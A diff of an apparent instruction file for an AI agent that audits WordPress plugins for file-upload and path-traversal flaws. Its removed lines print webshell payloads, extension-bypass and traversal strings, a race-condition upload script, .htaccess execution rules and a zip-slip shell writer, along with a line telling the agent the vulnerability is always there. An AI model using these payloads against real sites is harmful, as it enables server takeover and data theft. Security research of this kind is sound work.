@@ -170,145 +170,32 @@ if ( ! preg_match( $file_type_pattern, $file['name'] ) ) {
 **Why vulnerable:** The allowed file type list is sent from JavaScript client-side, not from server config. Attacker modifies the POST parameter to include `php%` or any extension. No server-side denylist of dangerous extensions.
 **Detection:** File upload handlers where the allowed-type/extension list comes from `$_POST`, `$_GET`, or `$_REQUEST` rather than a hardcoded server-side array. Also look for `wp_check_filetype()` (extension-only) instead of `wp_check_filetype_and_ext()` (extension + content).
 
-### CVE-2022-0320: Essential Addons for Elementor — LFI via Template Loading
-**Impact:** Unauthenticated LFI → RCE, CVSS 9.8 (1M+ installations)
-
-```php
-// AJAX handler loads template file — user controls the path components
-$template_info = $_REQUEST['templateInfo'];
-$file_path = sprintf('%s/Template/%s/%s',
-    $dir_path,
-    $template_info['name'],      // User-controlled
-    $template_info['file_name']  // User-controlled
-);
-// Path check WITHOUT realpath() — bypassable with ../
-if (!$file_path || 0 !== strpos($file_path, $dir_path)) { /* reject */ }
-include($file_path);  // LFI → include any PHP file on disk
-```
-
-**Why vulnerable:** The `strpos()` containment check operates on the RAW string before resolving `../` sequences. `$dir_path . "/Template/../../wp-config.php"` still starts with `$dir_path`. Fix required `realpath()` BEFORE the containment check.
-**Detection:** `include/require` with user-controlled path components where validation uses `strpos()` without `realpath()`. Also look for `sanitize_text_field()` on file paths — it does NOT strip `../`.
-
-### CVE-2024-8104: WP Extended — Path Traversal File Read
-**Impact:** Subscriber+ Arbitrary File Read, CVSS 8.8
-
-```php
-// AJAX handler — no auth check, no nonce, no path validation
-public function download_file_ajax() {
-    $filename = $_GET['filename'];  // Raw user input
-    $file_path = $dir . "/" . $filename;  // Direct concatenation
-    // filename=../../wp-config.php → reads wp-config.php
-    readfile($file_path);  // Serves file contents to attacker
-}
-```
-
-**Why vulnerable:** Triple failure: no `current_user_can()`, no nonce verification, and no path sanitization. `$filename` with `../../` escapes the intended export directory. Fix added capability check + `realpath()` + directory containment validation.
-**Detection:** `readfile()`, `file_get_contents()`, `fread()`, or `fpassthru()` with path built from user input. Look for missing `realpath()` + containment check, and `basename()` vs direct concatenation.
+**See also:** CVE-2022-0320 (Essential Addons for Elementor — LFI via `include()` with `strpos()` check but no `realpath()`, CVSS 9.8) | CVE-2024-8104 (WP Extended — path traversal file read via raw `$_GET` in `readfile()`, CVSS 8.8)
 
 ---
 
 ## Attack Techniques
 
-### 1. Extension Bypass Techniques
-```
-# Case variations
-file.PHP, file.Php, file.pHP, file.phP
+> **Generic bypass payloads omitted** — case variations, double extensions, null bytes, URL-encoded traversals, MIME tricks, race conditions, zip slip, and phar wrappers are standard knowledge. Focus on WordPress-specific patterns below.
 
-# Double extensions
-file.php.jpg, file.php.png, file.jpg.php
-
-# Null byte (older PHP)
-file.php%00.jpg, file.php\x00.jpg
-
-# Alternative PHP extensions
-.phtml, .phar, .inc, .phps, .php3, .php4, .php5, .php7
-
-# Apache handler bypass
-file.php.xxxxx (if AddHandler used without $)
-
-# IIS semicolon trick
-file.asp;.jpg, file.php;.jpg
-```
-
-### 2. MIME Type Bypass
+### WordPress-Specific Upload Bypass Patterns
 ```php
-// Create polyglot file (valid image + PHP)
-GIF89a<?php system($_GET['cmd']); ?>
+// wp_handle_upload() — $overrides can disable type checking entirely
+wp_handle_upload($file, array('test_form' => false, 'test_type' => false));
 
-// MIME type is client-controlled - never trust it
-$_FILES['file']['type']  // Attacker controls this!
-```
+// wp_check_filetype() checks extension ONLY — no content validation
+// wp_check_filetype_and_ext() checks both — look for which one is used
+$check = wp_check_filetype($filename);  // WEAK — extension only
 
-### 3. Path Traversal Payloads
-```
-# Basic
-../../../wp-config.php
-..\..\..\..\wp-config.php
+// media_handle_upload() trusts client filename — path traversal in name
+media_handle_upload('file_field', $post_id);
 
-# URL encoded
-%2e%2e%2f%2e%2e%2f%2e%2e%2fwp-config.php
-%2e%2e%5c%2e%2e%5c%2e%2e%5cwp-config.php
+// Allowed types from client-side / plugin options instead of hardcoded list
+$allowed = explode(',', $_POST['allowed_types']);  // Attacker-controlled!
+$allowed = get_option('plugin_allowed_extensions');  // Modifiable via options update
 
-# Double URL encoded
-%252e%252e%252f
-
-# Unicode/overlong UTF-8
-..%c0%af..%c0%af
-..%ef%bc%8f..%ef%bc%8f
-
-# Null byte (older PHP)
-../../../etc/passwd%00.jpg
-
-# Absolute path
-/etc/passwd
-C:\Windows\System32\config\SAM
-```
-
-### 4. Race Condition Exploitation
-```python
-# TOCTOU: File exists between upload and validation
-import threading
-import requests
-
-def upload_shell():
-    while True:
-        requests.post(url, files={'file': ('shell.php', '<?php system($_GET["c"]); ?>')})
-
-def execute_shell():
-    while True:
-        requests.get(url + '/uploads/shell.php?c=id')
-
-# Run both simultaneously
-threading.Thread(target=upload_shell).start()
-threading.Thread(target=execute_shell).start()
-```
-
-### 5. .htaccess Upload for RCE
-```apache
-# Upload this as .htaccess to enable PHP in uploads
-AddType application/x-httpd-php .jpg
-AddHandler php-script .jpg
-
-# Or enable PHP engine
-php_flag engine on
-
-# Or use auto_prepend
-php_value auto_prepend_file /path/to/shell.txt
-```
-
-### 6. Zip Slip Attack
-```python
-# Create malicious zip with path traversal
-import zipfile
-with zipfile.ZipFile('malicious.zip', 'w') as z:
-    z.writestr('../../../wp-content/shell.php', '<?php system($_GET["c"]); ?>')
-```
-
-### 7. Phar Deserialization
-```php
-// If file_exists(), is_file(), etc. are called on user input
-// and there's a gadget chain available
-phar://path/to/uploaded.phar/anything
+// .htaccess / .user.ini upload — if extension not explicitly blocked
+// Enables PHP execution in uploads directory
 ```
 
 ---
@@ -372,24 +259,6 @@ wpguard_sandbox_request(
 
 ## Finding Creation
 
-**IMPORTANT: Every finding description MUST include a `## Prerequisites` section** using this exact structured format. Every field must be explicitly filled — no omissions, no vague descriptions.
-
-```markdown
-## Prerequisites
-- **Base plugins:** [WooCommerce 8.0+] or [None]
-- **Plugin settings:** [Settings > Uploads > Enable file uploads = ON] or [Default settings]
-- **Required content:** [At least one published product with featured image] or [None]
-- **Required roles/users:** [WooCommerce `customer` role] or [Default WordPress roles]
-- **WordPress config:** [Multisite enabled] or [Standard single-site]
-- **Sandbox setup steps:**
-  1. `wpguard_sandbox_install_plugin(slug="woocommerce")` or [None — no extra setup]
-```
-
-Every field MUST have either a specific value or an explicit "[None]" / "[Default ...]". Vague entries like "check plugin settings" will be rejected by QA.
-
-
-Create findings for EVERY potential file operation issue:
-
 ```python
 wpguard_finding_create(
     plugin_slug="example-plugin",
@@ -397,31 +266,21 @@ wpguard_finding_create(
     active_installs=50000,
     vuln_type="arbitrary_file_upload",  # or arbitrary_file_read, arbitrary_file_delete, path_traversal
     title="Arbitrary PHP File Upload via Profile Image",
-    description="""
-## Vulnerability Summary
+    description="""## Vulnerability Summary
 Arbitrary file upload allowing PHP execution via extension bypass.
 
 ## Data Flow
-Entry: AJAX action "upload_avatar" (subscriber+)
-  ↓
-Input: $_FILES['avatar']
-  ↓
-Validation: pathinfo($name, PATHINFO_EXTENSION) checked against ['jpg','png','gif']
-  ↓
-BYPASS: Double extension file.php.jpg passes check but executes as PHP
-  ↓
-Sink: move_uploaded_file() to /wp-content/uploads/avatars/
-  ↓
-RCE: Uploaded PHP file accessible and executable
+Entry: AJAX "upload_avatar" (subscriber+) → $_FILES['avatar'] →
+pathinfo() extension check against ['jpg','png','gif'] →
+BYPASS: double extension .php.jpg → move_uploaded_file() to /uploads/avatars/ → RCE
 
 ## Prerequisites
-None — works with default plugin settings.
-
-## Exploitation
-1. Create file with double extension: shell.php.jpg
-2. Upload as avatar image
-3. Access /wp-content/uploads/avatars/shell.php.jpg
-4. PHP executes due to Apache AddHandler configuration
+- **Base plugins:** [None]
+- **Plugin settings:** [Default settings]
+- **Required content:** [None]
+- **Required roles/users:** [Default WordPress roles]
+- **WordPress config:** [Standard single-site]
+- **Sandbox setup steps:** [None — no extra setup]
     """,
     auth_level="subscriber",
     cvss_score=9.8,
@@ -447,69 +306,4 @@ Path Traversal + File Write: 9.8 Critical
 
 ---
 
-## Dynamic Validation REQUIRED
-
-**You MUST test findings in the sandbox before saving.** Static analysis alone is not sufficient.
-
-- **`status="validated"`** — ONLY if you performed a `wpguard_sandbox_request()` that confirms the vulnerability (e.g., file was created/read/deleted, PHP code executed, path traversal returned file contents)
-- **`status="draft"`** — If static analysis is promising but sandbox testing was inconclusive, failed, or you ran out of turns. Include what you tried and what happened.
-
-**Never save a finding as "validated" based on code reading alone.** A promising code path that fails dynamic testing is a draft, not a finding. This prevents false positives from wasting the entire downstream pipeline (PoC Writer → PoC Runner → QA).
-
----
-
-## Progress Saving (CRITICAL)
-
-**Save findings IMMEDIATELY as you discover them — do NOT accumulate findings in memory.**
-
-1. The moment you identify a vulnerability, call `wpguard_finding_create()` right away
-2. If unsure, create it as `status="draft"` — drafts are reviewed by QA, never lost
-3. Do NOT wait until the end to report — if you run out of context, unsaved findings are LOST
-4. The PM and poc-writer will handle PoC scripts — your job is to find vulns and save them
-
-### Progress Report (REQUIRED before finishing)
-
-Before your final response to the PM, save a progress report to `reports/{plugin_slug}/progress_{agent_name}.md` with:
-
-```markdown
-# Progress Report: {agent_name} on {plugin_slug}
-
-## Files Analyzed
-- [x] includes/ajax.php — fully analyzed
-- [x] includes/admin.php — fully analyzed
-- [ ] includes/api.php — partially analyzed (stopped at line 250)
-- [ ] lib/import.php — NOT analyzed
-
-## Findings Created
-- {finding_id}: {title} (status: {draft/validated})
-
-## Remaining Work
-- includes/api.php lines 250+ — has register_rest_route calls not yet reviewed
-- lib/import.php — contains unserialize() call, needs full trace
-- All shortcode handlers in includes/shortcodes/ — not yet checked
-
-## Notes
-- {any patterns observed, areas that looked promising but need more time}
-```
-
-**Why this matters:** If you run out of context, the PM will relaunch you (or another expert) with this progress report so analysis continues from where you left off instead of restarting from scratch.
-
----
-
-## When Finished
-
-Report all findings back to the PM. For each finding, include:
-- Vulnerability type, affected file/function/line
-- Data flow (entry point → processing → sink)
-- Authentication level required
-- Suggested CVSS score and vector
-- Whether exploitation was verified or if it's a draft finding (static analysis only)
-
-Also report:
-- **Progress report saved:** `reports/{plugin_slug}/progress_{agent_name}.md`
-- **Analysis complete:** YES / PARTIAL (ran out of context — {N} files remain)
-- If PARTIAL, list the most promising unanalyzed areas so the PM can relaunch
-
-The PM will coordinate the PoC Writer and verification pipeline.
-
-**Remember: The vulnerability IS there. Your job is to find it. Don't give up.**
+{{include:_expert-shared.md|validation_example=file was created/read/deleted, PHP code executed, path traversal returned file contents}}
